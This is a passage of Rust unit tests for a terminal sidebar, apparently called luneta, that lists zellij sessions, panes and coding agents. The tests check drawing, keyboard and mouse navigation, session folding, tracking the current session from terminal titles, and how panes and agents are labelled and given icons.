            (cell.fg, cell.modifier.contains(Modifier::DIM))
        };
        let rule = |sidebar: &mut Sidebar| look(&collapsed(sidebar, 3, moment(160_000)), 0, 0);
        let open = look(&drawn(&mut sidebar, false, COLUMNS, 6), 0, 1);
        assert_eq!(rule(&mut sidebar), open);
        sidebar.image_going(Some("far".parse().unwrap()));
        // The note, ` image on its way to far`, takes the last line.
        let buffer = drawn(&mut sidebar, false, COLUMNS, 6);
        assert_eq!(buffer[(1, 5)].symbol(), "i");
        let note = look(&buffer, 1, 5);
        assert_ne!(note, open);
        assert_eq!(rule(&mut sidebar), note);
        sidebar.lost("gone".to_owned());
        assert_eq!(rule(&mut sidebar).0, ERROR);
        sidebar.heard(idle_agent());
        sidebar.image_going(None);
        assert_eq!(rule(&mut sidebar), open);
    }

    /// The sidebar's last column is its edge, open or collapsed: a `│` down
    /// every line, on the terminal's background beside the highlight too, and
    /// drawn as the title's rule is, in the accent while the sidebar has the
    /// keys, and dim while zellij or a brief has them.
    #[test]
    fn the_sidebar_ends_in_an_edge_in_the_accent_while_it_has_the_keys() {
        let mut sidebar = two_sessions();
        let edge = |buffer: &Buffer| {
            let x = buffer.area.width - 1;
            let look = |y| {
                let cell = &buffer[(x, y)];
                (cell.symbol().to_owned(), cell.fg, cell.bg, cell.modifier)
            };
            (0..buffer.area.height).map(look).collect::<Vec<_>>()
        };
        let accent = ("│".to_owned(), ACCENT, Color::Reset, Modifier::empty());
        let dim = ("│".to_owned(), gruvbox::FG1, Color::Reset, Modifier::DIM);
        let open = drawn(&mut sidebar, true, COLUMNS, 10);
        assert!((0..10).any(|y| open[(0, y)].bg == LIT), "a row is lit");
        assert_eq!(edge(&open), vec![accent; 10]);
        sidebar.focus(Keys::Lent);
        let area = Rect::new(0, 0, COLUMNS, 10);
        let mut lent = Buffer::empty(area);
        sidebar.draw(&mut lent, area, moment(160_000));
        assert_eq!(edge(&lent), vec![dim.clone(); 10]);
        assert_eq!(edge(&drawn(&mut sidebar, false, COLUMNS, 10)), vec![dim.clone(); 10]);
        assert_eq!(edge(&collapsed(&mut sidebar, 10, moment(160_000))), vec![dim; 10]);
    }

    /// A daemon of another build can list a session with no start, or with
    /// no socket, which the sidebar cannot tell from another, or with a name
    /// zellij refuses, which luneta can neither go to nor fold. A name longer
    /// than luneta makes one is zellij's to refuse: where the user's id is
    /// short, it makes one of 66 bytes.
    #[test]
    fn a_session_with_no_start_or_socket_or_a_refused_name_is_left_out_and_said() {
        let mut sidebar = fresh();
        let mut unstarted = session("x", 0, vec![]);
        unstarted.started_at = None;
        let mut unsocketed = session("z", 30, vec![]);
        unsocketed.socket = 0;
        let misnamed = session("a/b", 40, vec![]);
        let long = session(&"w".repeat(66), 50, vec![]);
        let sessions = vec![unstarted, session("y", 20, vec![]), unsocketed, misnamed, long];
        sidebar.heard(host(sessions, Vec::new()));
        let lines = screen(&mut sidebar, false, 60, 8);
        assert_eq!(lines[1], format!("─ 2 sessions {}", "─".repeat(46)));
        assert_eq!(lines[4], format!(" ▾ y {}", "─".repeat(53)));
        assert!(lines[5].starts_with(" ▾ wwww"), "{:?}", lines[5]);
        assert_eq!(lines[6], " lunetad: 3 sessions with no start or socket, or a name ze");
        assert_eq!(lines[7], " llij refuses, not listed");
    }

    /// `▌` marks the pane luneta's zellij is on, down the line of its branch
    /// too, with the focus or without. While the sidebar does not have the
    /// focus, the highlight rests on that pane; once it has, the highlight
    /// goes with the keys, and comes back as the sidebar gives the focus
    /// back. A click on another pane leaves it on yours, as `▌` is, until
    /// luneta's zellij is there.
    #[test]
    fn the_highlight_rests_on_your_pane_until_the_sidebar_has_the_focus() {
        let mut sidebar = fresh();
        let mut host = host(
            vec![
                session("newer", 20, vec![pane(1, 0, "/w/b", "fish")]),
                session(
                    "older",
                    10,
                    vec![pane(2, 1, "/w/c", "nvim src/main.rs"), pane(1, 0, "/w/a", "fish")],
                ),
            ],
            Vec::new(),
        );
        let changes = Some(api::Changes::default());
        let head = Some(api::checkout::Head::Branch(api::Branch { name: "main".to_owned(), upstream: None, changed: None }));
        let checkout = api::Checkout { head, changes, stashes: 0, repository: None };
        host.work_trees = vec![api::WorkTree {
            dir: "/w/c".to_owned(),
            stands: Some(api::work_tree::Stands::Checkout(checkout)),
        }];
        assert_eq!(sidebar.heard(host), None);
        let look = sidebar.titled("older | nvim".to_owned()).unwrap();
        assert_eq!(look.session, "older");
        let clients = vec![Client { id: 1, pane: Some(2) }];
        sidebar.looked(Looked { number: look.number, went: None, clients, before: None });

        let (lines, lit) = seen(&mut sidebar, false, 32, 13);
        assert_eq!(lines[6..8], ["▌    \u{e6ae} nvim src/main.rs", "▌      main"]);
        assert_eq!(lit, [6, 7]);
        // The legend leaves the rows four lines, which scroll a line for
        // the pane to show whole, and stay so once the focus goes.
        let (_, lit) = seen(&mut sidebar, true, 32, 20);
        assert_eq!(lit, [5, 6]);
        sidebar.key(&KeyEvent::new(KeyCode::Char('k'), KeyModifiers::NONE), moment(160_000));
        let (lines, lit) = seen(&mut sidebar, true, 32, 20);
        let nvim = "▌    \u{e6ae} nvim src/main.rs";
        assert_eq!((lines[5].as_str(), lit.as_slice()), (nvim, &[4][..]));
        let (_, lit) = seen(&mut sidebar, false, 32, 14);
        assert_eq!(lit, [5, 6]);
        let fish = pane_of("older", 10, 1);
        assert_eq!(click(&mut sidebar, 10, 4, Rect::new(0, 0, 32, 14)), go_here(fish));
        let (_, lit) = seen(&mut sidebar, false, 32, 14);
        assert_eq!(lit, [5, 6]);
    }

    #[test]
    fn the_highlight_skips_a_session_s_row_and_goes_no_further_than_the_ends() {
        let mut sidebar = two_sessions();
        let older = Some(pane_of("older", 10, 1));
        let newer = Some(pane_of("newer", 20, 1));
        assert_eq!(cursor(&sidebar), older);
        sidebar.step(1);
        sidebar.step(1);
        assert_eq!(cursor(&sidebar), newer);
        sidebar.step(1);
        assert_eq!(cursor(&sidebar), newer);
        sidebar.step(-5);
        assert_eq!(cursor(&sidebar), older);
    }

    /// `G` and `End` take the highlight to the last row, and `gg` and `Home`
    /// to the first. A key between the two `g`s drops the first, with `Ctrl`
    /// too, and so do the wheel, a click and the focus going, but not the
    /// pointer moving. `Esc` after a `g` does nothing else, and leaves the
    /// sidebar pressed again.
    #[test]
    fn g_and_end_go_to_the_last_row_and_gg_and_home_to_the_first() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        let first = Some(pane_of("older", 10, 1));
        let second = Some(pane_of("older", 10, 2));
        let last = Some(pane_of("newer", 20, 1));
        let key = |code| KeyEvent::new(code, KeyModifiers::NONE);
        // Shift and all, as a terminal sends it as text.
        let shift_g = KeyEvent::new(KeyCode::Char('G'), KeyModifiers::SHIFT);
        let g = key(KeyCode::Char('g'));
        sidebar.key(&shift_g, moment(160_000));
        assert_eq!(cursor(&sidebar), last);
        sidebar.key(&g, moment(160_000));
        assert_eq!(cursor(&sidebar), last);
        sidebar.key(&g, moment(160_000));
        assert_eq!(cursor(&sidebar), first);
        sidebar.key(&key(KeyCode::End), moment(160_000));
        assert_eq!(cursor(&sidebar), last);
        sidebar.key(&key(KeyCode::Home), moment(160_000));
        assert_eq!(cursor(&sidebar), first);
        let ctrl_x = KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL);
        for pressed in [key(KeyCode::End), g, key(KeyCode::Char('k')), g, ctrl_x, g] {
            sidebar.key(&pressed, moment(160_000));
        }
        assert_eq!(cursor(&sidebar), second);
        // Tall enough for the legend to leave newer's row on screen.
        let area = Rect::new(0, 0, 32, 21);
        screen(&mut sidebar, true, area.width, area.height);
        sidebar.mouse(mouse(MouseEventKind::ScrollUp, 0, 0), area);
        sidebar.key(&g, moment(160_000));
        assert_eq!(cursor(&sidebar), second);
        // luneta hears every move of the pointer.
        sidebar.mouse(mouse(MouseEventKind::Moved, 0, 0), area);
        sidebar.key(&g, moment(160_000));
        assert_eq!(cursor(&sidebar), first);
        // The triangle folds newer, and the highlight goes to its row.
        sidebar.key(&g, moment(160_000));
        assert_eq!(click(&mut sidebar, 1, 7, area), Asked::Take);
        let folded = Some(Place::Session(listed("newer", 20)));
        sidebar.key(&g, moment(160_000));
        assert_eq!(cursor(&sidebar), folded);
        sidebar.focus(Keys::Zellij);
        sidebar.focus(Keys::Sidebar);
        sidebar.key(&g, moment(160_000));
        assert_eq!(cursor(&sidebar), folded);
        let esc = key(KeyCode::Esc);
        assert_eq!(sidebar.key(&esc, moment(160_000)), Asked::Nothing);
        assert_eq!(sidebar.key(&esc, moment(160_000)), Asked::Leave);
    }

    /// zellij versions with sockets of their own can each run a session under
    /// one name, and the daemon lists them both, with no panes.
    #[test]
    fn the_highlight_goes_on_past_a_second_session_of_a_name() {
        let mut sidebar = fresh();
        sidebar.heard(host(
            vec![
                session("x", 10, vec![]),
                session("y", 20, vec![pane(1, 0, "/w/y", "fish")]),
                session("x", 30, vec![]),
                session("z", 40, vec![]),
            ],
            Vec::new(),
        ));
        let down = KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE);
        for _ in 0..3 {
            sidebar.key(&down, moment(160_000));
        }
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        let z = Place::Session(listed("z", 40));
        assert_eq!(sidebar.key(&enter, moment(160_000)), go_here(z));
    }

    #[test]
    fn folding_a_pane_s_session_stops_the_highlight_on_its_row() {
        let mut sidebar = two_sessions();
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        sidebar.key(&KeyEvent::new(KeyCode::Char('h'), KeyModifiers::NONE), moment(160_000));
        let older = Place::Session(listed("older", 10));
        assert_eq!(cursor(&sidebar), Some(older.clone()));
        assert_eq!(sidebar.key(&enter, moment(160_000)), go_here(older));
        let lines = screen(&mut sidebar, false, 32, 6);
        assert!(lines[4].starts_with(" ▸ older"), "{lines:?}");
        assert!(lines[5].starts_with(" ▾ newer"), "{lines:?}");
        sidebar.key(&KeyEvent::new(KeyCode::Char(' '), KeyModifiers::NONE), moment(160_000));
        assert_eq!(sidebar.rows.len(), 6);
    }

    /// `Alt Tab` goes to the pane listed after the one luneta's zellij is on,
    /// across sessions, and from the last back to the first.
    #[test]
    fn the_next_pane_is_the_one_listed_after_luneta_s() {
        let older = |pane| pane_of("older", 10, pane);
        let newer = pane_of("newer", 20, 1);
        let cases = [
            ("within its session", older(1), older(2)),
            ("into the next session", older(2), newer.clone()),
            ("from the last to the first", newer.clone(), older(1)),
        ];
        for (case, on, next) in cases {
            let mut sidebar = two_sessions();
            sidebar.went(&on);
            assert_eq!(sidebar.next_pane(), Some(next), "{case}");
        }
        // On a pane no row lists, as a plugin's, or one luneta is not sure
        // its zellij is on; and in a session no row lists.
        let mut sidebar = two_sessions();
        assert_eq!(sidebar.next_pane(), Some(older(1)));
        sidebar.titled("gone".to_owned());
        assert_eq!(sidebar.next_pane(), Some(older(1)));
    }

    /// Back in a session zellij titles nothing for, luneta's zellij goes on
    /// from where luneta sent it, and not from the session of the title, whose
    /// clients are another's.
    #[test]
    fn the_next_pane_follows_luneta_s_zellij_past_a_stale_title() {
        let mut sidebar = two_sessions();
        let older = |pane| pane_of("older", 10, pane);
        sidebar.went(&pane_of("newer", 20, 1));
        sidebar.titled("newer | fish".to_owned());
        sidebar.went(&older(1));
        assert_eq!(sidebar.next_pane(), Some(older(2)));
    }

    #[test]
    fn the_next_pane_passes_over_a_folded_session() {
        let mut sidebar = two_sessions();
        sidebar.went(&pane_of("older", 10, 2));
        sidebar.key(&KeyEvent::new(KeyCode::Char('h'), KeyModifiers::NONE), moment(160_000));
        let newer = pane_of("newer", 20, 1);
        assert_eq!(sidebar.next_pane(), Some(newer.clone()));
        // The only pane listed is luneta's own.
        sidebar.went(&newer);
        assert_eq!(sidebar.next_pane(), None);
    }

    /// Going to a folded session unfolds it, whichever way luneta's zellij
    /// goes: from the sidebar or the menu, by zellij's own switch, which the
    /// title follows, or as a client takes the place of one that ended. Its
    /// panes are listed, so `Alt Tab` goes on to the next of them, and not to
    /// the next session's.
    #[test]
    fn going_to_a_folded_session_unfolds_it() {
        let older = |pane| pane_of("older", 10, pane);
        // luneta's zellij in newer, and older folded.
        let away = || {
            let mut sidebar = two_sessions();
            sidebar.titled("newer | fish".to_owned());
            fold(&mut sidebar, "older");
            sidebar
        };
        let mut sidebar = away();
        sidebar.went(&older(1));
        assert!(!folded(&sidebar, "older"));
        assert_eq!(sidebar.next_pane(), Some(older(2)));
        let mut sidebar = away();
        sidebar.titled("older | ~/w/luneta".to_owned());
        assert!(!folded(&sidebar, "older"));
        assert_eq!(sidebar.next_pane(), Some(older(1)));
        let mut sidebar = away();
        sidebar.rejoining(&session_name("older"));
        assert!(!folded(&sidebar, "older"));
        assert_eq!(sidebar.next_pane(), Some(older(1)));
    }

    /// A go zellij does not make leaves luneta's zellij in the session it was
    /// in, which it did not go to: folded there, it stays folded.
    #[test]
    fn a_go_zellij_does_not_make_keeps_the_session_luneta_stays_in_folded() {
        let mut sidebar = two_sessions();
        fold(&mut sidebar, "older");
        let look = sidebar.went(&pane_of("newer", 20, 1)).unwrap();
        sidebar.stayed(look.number);
        assert_eq!(sidebar.here(), Some("older"));
        assert!(folded(&sidebar, "older"));
    }

    /// zellij titles luneta's terminal with the session's name and a ` | `,
    /// which a name can hold too: the title of `odd | name`, which the daemon
    /// has yet to list, reads as `odd`'s. Starting `odd | name` unfolds it,
    /// and leaves `odd` folded.
    #[test]
    fn going_to_a_session_named_with_a_bar_unfolds_it_alone() {
        let mut sidebar = fresh();
        sidebar.heard(host(vec![session("odd", 2, vec![]), session("other", 3, vec![])], vec![]));
        sidebar.titled("other | fish".to_owned());
        fold(&mut sidebar, "odd");
        fold(&mut sidebar, "odd | name");
        sidebar.sending(&session_name("odd | name"));
        sidebar.titled("odd | name | fish".to_owned());
        assert!(folded(&sidebar, "odd"));
        assert!(!folded(&sidebar, "odd | name"));
    }

    #[test]
    fn a_gone_pane_leaves_the_highlight_in_its_session() {
        let mut sidebar = two_sessions();
        sidebar.step(1);
        sidebar.heard(host(
            vec![session("older", 10, vec![pane(1, 0, "/w/luneta/main", "claude")])],
            Vec::new(),
        ));
        assert_eq!(cursor(&sidebar), Some(pane_of("older", 10, 1)));
    }

    /// Focused, on fewer lines than its rows take, the sidebar scrolls them
    /// to keep the highlight on screen as it moves down, and back up.
    #[test]
    fn the_rows_scroll_to_keep_the_highlight_on_screen() {
        let mut sidebar = two_sessions();
        let down = KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE);
        let up = KeyEvent::new(KeyCode::Char('k'), KeyModifiers::NONE);
        // Two lines, between the title and the rule along the top and the
        // legend at the bottom.
        let shown = |sidebar: &mut Sidebar| screen(sidebar, true, 32, 18)[3..5].to_vec();
        assert_eq!(
            shown(&mut sidebar),
            [" ▾ older ────────────────── ●1", "   ● \u{ec82} fold                 1m"]
        );
        sidebar.key(&down, moment(160_000));
        sidebar.key(&down, moment(160_000));
        assert_eq!(shown(&mut sidebar), [" ▾ newer ─────────────────────", "     \u{e795} w/b"]);
        sidebar.key(&up, moment(160_000));
        assert_eq!(
            shown(&mut sidebar),
            ["     \u{e6ae} nvim src/main.rs", " ▾ newer ─────────────────────"]
        );
    }

    fn mouse(kind: MouseEventKind, column: u16, row: u16) -> MouseEvent {
        MouseEvent { kind, column, row, modifiers: KeyModifiers::NONE }
    }

    /// A click at `column` and `row` on the sidebar drawn in `area`: what the
    /// left button asks as it lets go there, having asked nothing as it went
    /// down.
    fn click(sidebar: &mut Sidebar, column: u16, row: u16, area: Rect) -> Asked {
        let down = mouse(MouseEventKind::Down(MouseButton::Left), column, row);
        assert_eq!(sidebar.mouse(down, area), Asked::Nothing);
        sidebar.mouse(mouse(MouseEventKind::Up(MouseButton::Left), column, row), area)
    }

    #[test]
    fn a_click_goes_to_a_pane_and_folds_on_the_triangle() {
        let mut sidebar = two_sessions();
        let area = Rect::new(0, 0, 32, 10);
        screen(&mut sidebar, false, area.width, area.height);
        let pane = pane_of("older", 10, 2);
        assert_eq!(click(&mut sidebar, 10, 6, area), go_here(pane));
        assert_eq!(click(&mut sidebar, 10, 4, area), Asked::Take);
        assert!(!folded(&sidebar, "older"));
        assert_eq!(click(&mut sidebar, 1, 4, area), Asked::Take);
        assert!(folded(&sidebar, "older"));
        let older = Place::Session(listed("older", 10));
        assert_eq!(click(&mut sidebar, 10, 4, area), go_here(older));
    }

    /// A search with nothing typed keeps the folds, and the triangle folds as
    /// it does without one. Once something is typed, it is the name's, and a
    /// machine's header folds nothing.
    #[test]
    fn a_click_on_the_triangle_folds_until_a_search_is_typed() {
        let mut sidebar = two_sessions();
        let area = Rect::new(0, 0, 32, 10);
        sidebar.key(&KeyEvent::new(KeyCode::Char('/'), KeyModifiers::NONE), moment(160_000));
        screen(&mut sidebar, true, area.width, area.height);
        assert_eq!(click(&mut sidebar, 1, 4, area), Asked::Take);
        assert!(folded(&sidebar, "older"));
        assert_eq!(click(&mut sidebar, 1, 4, area), Asked::Take);
        assert!(!folded(&sidebar, "older"));
        assert!(sidebar.search.is_some());
        type_in(&mut sidebar, "older");
        screen(&mut sidebar, true, area.width, area.height);
        assert_eq!(click(&mut sidebar, 1, 4, area), Asked::Take);
        assert!(!folded(&sidebar, "older"));
        assert_eq!(click(&mut sidebar, 10, 3, area), Asked::Take);
        assert!(!sidebar.folds.contains(Fold::Machine(&Machine::Local)));
    }

    /// A session zellij has yet to list the panes of stands in for them, as a
    /// folded one does, for a click as for `Enter`.
    #[test]
    fn a_click_on_a_session_with_no_panes_goes_there() {
        let mut sidebar = fresh();
        let mut starting = session("x", 10, Vec::new());
        starting.panes = None;
        sidebar.heard(host(vec![starting], Vec::new()));
        let area = Rect::new(0, 0, 32, 5);
        screen(&mut sidebar, false, area.width, area.height);
        let x = Place::Session(listed("x", 10));
        assert_eq!(click(&mut sidebar, 10, 4, area), go_here(x.clone()));
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&enter, moment(160_000)), go_here(x));
    }

    /// The notes at the bottom stand over the rows that would be there, which
    /// a click on them does not go to.
    #[test]
    fn a_click_on_the_notes_goes_nowhere() {
        let mut sidebar = two_sessions();
        let area = Rect::new(0, 0, 32, 18);
        let lines = screen(&mut sidebar, true, area.width, area.height);
        assert!(lines[5].starts_with("─ luneta ─"), "{lines:?}");
        assert_eq!(click(&mut sidebar, 10, 5, area), Asked::Take);
        let fold = pane_of("older", 10, 1);
        assert_eq!(click(&mut sidebar, 10, 4, area), go_here(fold));
    }

    #[test]
    fn the_session_is_the_one_zellij_titles_the_terminal_for() {
        let mut sidebar = fresh();
        sidebar.titled("odd | name | ~/w".to_owned());
        assert_eq!(sidebar.here(), Some("odd"));
        sidebar
            .heard(host(vec![session("odd | name", 1, vec![]), session("odd", 2, vec![])], vec![]));
        assert_eq!(sidebar.here(), Some("odd | name"));
        sidebar.titled("odd".to_owned());
        assert_eq!(sidebar.here(), Some("odd"));
        sidebar.titled("oddly | ~/w".to_owned());
        assert_eq!(sidebar.here(), Some("oddly"));
    }

    /// zellij sends a client no title as it comes back to a tab that had the
    /// same title before. So the session luneta sends its zellij to is the
    /// one it is in, until zellij titles the terminal once it is there; a
    /// title of the session it leaves can come on the way. A session zellij
    /// did not take it to leaves it in the one the title names.
    #[test]
    fn the_session_is_the_one_luneta_sent_zellij_to_until_a_title_after() {
        let mut sidebar = two_sessions();
        let newer = pane_of("newer", 20, 1);
        let look = sidebar.went(&newer).unwrap();
        assert_eq!((sidebar.here(), look.session.as_str()), (Some("newer"), "newer"));
        assert_eq!(sidebar.going(), Some("newer"));
        sidebar.titled("older | ~/w/luneta/main".to_owned());
        assert_eq!(sidebar.here(), Some("newer"));
        let clients = vec![Client { id: 1, pane: Some(1) }];
        let before = Some(Before::Listed(vec![]));
        sidebar.looked(Looked { number: look.number, went: Some(1), clients, before });
        assert_eq!((sidebar.here(), sidebar.going()), (Some("newer"), None));
        sidebar.titled("older".to_owned());
        assert_eq!(sidebar.here(), Some("older"));

        let look = sidebar.went(&newer).unwrap();
        let stayed = sidebar.stayed(look.number).map(|look| look.session);
        assert_eq!(stayed, Some("older".to_owned()));
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), None));
    }

    /// A client that comes back to a tab after its connection dropped gets no
    /// title, as zellij sent the one before it that title already. A go that
    /// zellij does not take leaves it in the session it came to all the same.
    #[test]
    fn a_go_zellij_does_not_take_leaves_an_untitled_client_where_it_came() {
        let mut sidebar = two_sessions();
        sidebar.title = None;
        let came = sidebar.rejoining(&session_name("older"));
        sidebar.unfound(came.number);
        let look = sidebar.went(&pane_of("newer", 20, 1)).unwrap();
        sidebar.stayed(look.number);
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), None));
    }

    /// luneta sends its zellij to another session, and then to a third
    /// before it is there. What comes back of the first go says nothing of
    /// the second: neither that the client is there, nor that it stayed.
    #[test]
    fn what_comes_back_of_an_earlier_go_says_nothing_of_the_last() {
        let mut sidebar = two_sessions();
        let newer = pane_of("newer", 20, 1);
        let older = pane_of("older", 10, 2);
        let first = sidebar.went(&newer).unwrap();
        let last = sidebar.went(&older).unwrap();
        let clients = vec![Client { id: 1, pane: Some(1) }];
        let came = |look: &Look| Looked {
            number: look.number,
            went: look.went,
            clients: clients.clone(),
            before: Some(Before::Listed(vec![])),
        };
        sidebar.looked(came(&first));
        assert_eq!(sidebar.stayed(first.number), None);
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), Some("older")));
        sidebar.looked(came(&last));
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), None));
    }

    #[test]
    fn a_client_luneta_did_not_find_where_it_started_it_lands_there_all_the_same() {
        let mut sidebar = two_sessions();
        let look = sidebar.rejoining(&session_name("older"));
        sidebar.unfound(look.number + 1);
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), Some("older")));
        sidebar.unfound(look.number);
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), None));
        assert_eq!(sidebar.stayed(look.number), None);
        assert_eq!(sidebar.here(), Some("older"));
    }

    #[test]
    fn the_menu_sends_you_to_a_pane_once_luneta_stops_looking_for_its_client() {
        let mut sidebar = two_sessions();
        let look = sidebar.rejoining(&session_name("older"));
        sidebar.unfound(look.number + 1);
        assert_eq!(sidebar.float_menu(), Err(NO_HERE_PANE));
        sidebar.unfound(look.number);
        assert_eq!(sidebar.float_menu(), Err(UNSURE_PANE));
        let went = sidebar.went(&pane_of("older", 10, 1)).unwrap();
        let clients = vec![Client { id: 1, pane: Some(1) }];
        sidebar.looked(Looked { number: went.number, went: went.went, clients, before: None });
        assert_eq!(sidebar.float_menu(), Ok(()));
    }

    #[test]
    fn a_go_luneta_could_not_follow_lands_until_a_title_says_otherwise() {
        let mut sidebar = two_sessions();
        sidebar.titled("older | fish".to_owned());
        let look = sidebar.went(&pane_of("newer", 20, 1)).unwrap();
        assert_eq!(sidebar.going(), Some("newer"));
        sidebar.unfound(look.number);
        assert_eq!((sidebar.here(), sidebar.going()), (Some("newer"), None));
        sidebar.titled("older | vim".to_owned());
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), None));
    }

    /// A shell at its prompt goes by its tab, if someone named it, as an agent
    /// does, and else by its directory; a program by its command, whatever the
    /// tab.
    #[test]
    fn a_pane_is_named_for_what_runs_in_it() {
        let named = |command: &str| label(None, &pane(3, 0, "/w/luneta/main", command));
        assert_eq!(named("-fish"), "luneta/main");
        assert_eq!(named("/bin/zsh -l"), "luneta/main");
        assert_eq!(named("cargo test"), "cargo test");
        assert_eq!(named("/nix/store/a1p5-neovim/bin/nvim --clean"), "nvim --clean");
        let unsaid = Pane { cwd: None, command: None, ..pane(3, 0, "", "") };
        assert_eq!(label(None, &unsaid), "pane 3");
        let tabbed = |pane: Pane| label(None, &Pane { tab_name: "review".to_owned(), ..pane });
        assert_eq!(tabbed(pane(3, 0, "/w/luneta/main", "-fish")), "review");
        assert_eq!(tabbed(pane(3, 0, "/w/luneta/main", "cargo test")), "cargo test");
        assert_eq!(tabbed(unsaid), "review");
    }

    /// An agent goes by the name someone gave it, then by the topic the daemon
    /// keeps of it, then by the title Claude Code gives its pane, then by its
    /// tab if someone named it, then by where it works: where its pane works, or
    /// else, while zellij has not said, where Claude Code says. An agent's title
    /// with no topic, as a bare `Claude Code`, is passed over, and so is
    /// zellij's `Tab #N`.
    #[test]
    fn an_agent_goes_by_its_name_then_its_topic_then_its_tab_then_its_directory() {
        let titled = |topic: Option<&str>, tab: &str| Pane {
            titled: Some(api::Titled { topic: topic.map(str::to_owned) }),
            tab_name: tab.to_owned(),
            ..pane(1, 0, "/w/x", "claude")
        };
        let untitled = |tab: &str| Pane { tab_name: tab.to_owned(), ..pane(1, 0, "/w/x", "claude") };
        let named = agent("s", 1, Status::Idle, Some("fold"));
        let unnamed = agent("s", 1, Status::Idle, None);
        let topic = titled(Some("Fix the fold"), "review");
        assert_eq!(label(Some(&named), &topic), "fold");
        assert_eq!(label(Some(&unnamed), &topic), "Fix the fold");
        assert_eq!(label(Some(&unnamed), &titled(None, "review")), "review");
        assert_eq!(label(Some(&unnamed), &untitled("review")), "review");
        assert_eq!(label(Some(&unnamed), &titled(None, "Tab #12")), "w/x");
        assert_eq!(label(Some(&unnamed), &untitled(" ")), "w/x");
        let unsaid = Pane { cwd: None, ..untitled("Tab #1") };
        assert_eq!(label(Some(&unnamed), &unsaid), "luneta/main");
        // A name Claude Code gave the session itself is none a row goes by.
        let mut derived = agent("s", 1, Status::Idle, Some("luneta-main"));
        let source = Some(NameSource::Derived.into());
        derived.name = derived.name.map(|name| api::Name { source, ..name });
        assert_eq!(label(Some(&derived), &topic), "Fix the fold");
        let kept =
            |agent: &Agent| Agent { topic: Some("Session folds".to_owned()), ..agent.clone() };
        assert_eq!(label(Some(&kept(&named)), &topic), "fold");
        assert_eq!(label(Some(&kept(&unnamed)), &topic), "Session folds");
        assert_eq!(label(Some(&kept(&derived)), &titled(None, "review")), "Session folds");
    }

    /// The icon of what runs in a pane has a column of its own, so that every
    /// label starts at the same column, and a program with none leaves it
    /// blank. An agent's is Claude's, whatever its terminal has in front, and
    /// `sudo` gives way to what it runs, though the row goes by its command.
    /// A shell the row is named for the directory of has a terminal's.
    #[test]
    fn a_pane_s_icon_says_what_runs_in_it_in_a_column_of_its_own() {
        let mut sidebar = fresh();
        let sudo = "/nix/store/fdsygnh4wvr7g860ba3cwlcksn8v1pc5-sudo-1.9.17p2/bin/sudo -k nvim x";
        sidebar.heard(host(
            vec![session(
                "s",
                10,
                vec![
                    pane(1, 0, "/w/a", "cargo test"),
                    pane(2, 1, "/w/b", sudo),
                    pane(3, 2, "/w/c", "make"),
                    pane(4, 3, "/w/d", "dash"),
                ],
            )],
            vec![agent("s", 1, Status::Idle, Some("fold"))],
        ));
        let lines = screen(&mut sidebar, false, 32, 9);
        assert_eq!(
            lines[5..],
            [
                "  •✓ \u{ec82} fold                 1m",
                "     \u{e6ae} sudo -k nvim x",
                "       make",
                "     \u{e795} w/d",
            ]
        );
    }

    /// An agent's icon is its harness's: pi's, or Claude's from a daemon that
    /// says none, older than the word, whose every agent is Claude Code's. Of
    /// a harness only a newer daemon knows, it is what the terminal has in
    /// front, as luneta has no icon for the agent.
    #[test]
    fn an_agent_s_icon_is_its_harness_s() {
        let mut sidebar = fresh();
        let of = |id: u32, harness: Option<i32>| Agent {
            harness,
            ..agent("s", id, Status::Idle, Some("x"))
        };
        let panes = (1..=3).map(|id| pane(id, id, "/w/a", "nvim")).collect();
        let agents = vec![of(1, Some(Harness::Pi.into())), of(2, None), of(3, Some(99))];
        sidebar.heard(host(vec![session("s", 10, panes)], agents));
        let start = |line: &String| line.chars().take(8).collect::<String>();
        let lines = screen(&mut sidebar, false, 32, 9);
        assert_eq!(
            lines[5..8].iter().map(start).collect::<Vec<_>>(),
            ["  •✓ \u{f03ff} x", "  •✓ \u{ec82} x", "  •✓ \u{e6ae} x"]
        );
    }

    /// A word an agent says that luneta does not know is marked by its
    /// initial, as a capital, in the one column a mark takes, so that its
    /// label starts where every other does. An initial that takes another
    /// number of columns marks it as one that says nothing.
    #[test]
    fn a_word_an_agent_says_is_marked_in_the_one_column_a_mark_takes() {
        let words = ["compacting", "ßa", "日本", "\u{301}a"];
        let says = |pane: u32, word: &str| Agent {
            status: Some(Reported::OtherStatus(word.to_owned())),
            ..agent("s", pane, Status::Idle, Some("x"))
        };
        let mut sidebar = fresh();
        let panes = (1..=4).map(|id| pane(id, id, "/w/a", "claude")).collect();
        let agents = words.into_iter().zip(1..).map(|(word, id)| says(id, word)).collect();
        sidebar.heard(host(vec![session("s", 10, panes)], agents));
        // Up to the label's first letter, a character to a column.
        let start = |line: &String| line.chars().take(8).collect::<String>();
        let lines = screen(&mut sidebar, false, 32, 9);
        assert_eq!(
            lines[5..].iter().map(start).collect::<Vec<_>>(),
            ["   C \u{ec82} x", "   S \u{ec82} x", "   ? \u{ec82} x", "   ? \u{ec82} x"]
        );
    }

    /// A pane with no agent in it is dimmed, its icon with its label.
    #[test]
    fn a_pane_with_no_agent_in_it_is_dimmed() {
        let mut sidebar = two_sessions();
        let buffer = drawn(&mut sidebar, false, 32, 8);
        // The icon and the label's first letter, on the agent's row and on
        // nvim's under it.
        let dim = |y: u16| [5_u16, 7].map(|x| buffer[(x, y)].modifier.contains(Modifier::DIM));
        assert_eq!((dim(5), dim(6)), ([false, false], [true, true]));
    }

    /// The daemon cannot follow an agent to the session it is in when the
    /// session was renamed before the daemon started. Its row is the pane of
    /// its id that works where it does, in the one session that lists one.
    #[test]
    fn an_agent_the_daemon_cannot_follow_sits_where_its_pane_works() {
        let mut lost = agent("gone", 1, Status::Waiting, Some("fold"));
